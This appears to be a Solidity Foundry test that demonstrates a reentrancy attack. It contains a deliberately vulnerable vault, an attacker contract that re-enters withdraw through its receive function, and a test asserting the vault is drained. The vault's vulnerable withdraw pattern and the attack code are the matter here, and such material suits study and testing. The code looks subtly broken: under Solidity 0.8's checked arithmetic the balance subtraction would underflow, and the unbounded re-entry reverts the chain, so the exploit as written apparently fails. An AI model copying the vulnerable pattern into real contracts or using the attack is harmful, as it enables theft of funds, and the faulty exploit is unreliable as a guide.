// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

contract VulnerableVault {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint amount) public {
        require(balances[msg.sender] >= amount, "Insufficient balance");

        // Vulnerability: External call before state update (Reentrancy)
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        balances[msg.sender] -= amount;
    }
}

contract Attacker {
    VulnerableVault public vault;
    bool public attackInProgress;

    constructor(address _vault) {
        vault = VulnerableVault(_vault);
    }

    // Fallback function to re-enter the withdraw function
    receive() external payable {
        if (attackInProgress) {
            vault.withdraw(1 ether);
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ether to attack");
        vault.deposit{value: 1 ether}();
        attackInProgress = true;
        vault.withdraw(1 ether);
        attackInProgress = false;
    }
}

contract ExploitTest is Test {
    VulnerableVault vault;
    Attacker attacker;

    function setUp() public {
        // Deploy the vulnerable contract
        vault = new VulnerableVault();

        // Deploy the attacker contract
        attacker = new Attacker(address(vault));

        // Fund the attacker contract with 1 ether
        vm.deal(address(attacker), 1 ether);

        // Fund the vault with 10 ether to simulate user deposits
        vm.deal(address(vault), 10 ether);
    }

    function test_exploit() public {
        // Initial balance of the attacker
        uint initialAttackerBalance = address(attacker).balance;

        // Execute the attack
        vm.prank(address(attacker));
        attacker.attack{value: 1 ether}();

        // Assert that the attacker has drained more than their initial deposit
        assertGt(address(attacker).balance, initialAttackerBalance);
    }
}